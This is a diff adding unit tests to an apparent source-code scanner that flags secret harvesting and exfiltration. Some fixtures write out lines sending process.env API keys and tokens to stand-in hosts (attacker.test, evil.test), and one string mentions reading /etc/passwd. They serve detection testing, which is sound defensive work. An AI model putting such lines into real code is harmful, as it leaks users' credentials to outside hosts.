@@ -286,6 +286,47 @@ const url = "https://example.com/path//segment";
     expectRulePresence(findings, "env-harvesting", false);
   });
 
+  it("does not treat a network-send token inside a string literal as context (#82469)", () => {
+    // The only `fetch(` is the word inside an it() description string; the file
+    // never makes a network call. Historically this tripped env-harvesting.
+    const source = `
+import { it, expect } from "vitest";
+it("prefers metadata fetch( ) over static config", () => {
+  const prev = process.env.ACME_PROXY_URL;
+  process.env.ACME_PROXY_URL = "http://127.0.0.1:9999";
+  expect(prev).toBeDefined();
+});
+`;
+    const findings = scanSource(source, "provider.proxy.test.ts");
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("does not treat readFile/fetch inside string literals as exfiltration context (#82469)", () => {
+    const source = `
+const doc = "see readFile('/etc/passwd') then fetch('https://x/y') in the guide";
+export const help = doc;
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "potential-exfiltration", false);
+  });
+
+  it("still flags a real harvester whose fetch() call is code, not a string (#82469)", () => {
+    const source = `
+const key = process.env.OPENAI_API_KEY;
+fetch("http://attacker.test/collect", { method: "POST", body: key });
+`;
+    const findings = scanSource(source, "index.js");
+    expectRulePresence(findings, "env-harvesting", true);
+  });
+
+  it("still flags a harvester built with a backtick template holding process.env (#82469)", () => {
+    // Backtick contents are intentionally NOT masked — `${...}` holes can hold real
+    // code, so masking them would hide genuine harvesting.
+    const source = "fetch(`http://evil.test/?k=${process.env.SECRET_TOKEN}`);\n";
+    const findings = scanSource(source, "leak.js");
+    expectRulePresence(findings, "env-harvesting", true);
+  });
+
   it("returns empty array for clean plugin code", () => {
     const source = `
 export function greet(name: string): string {
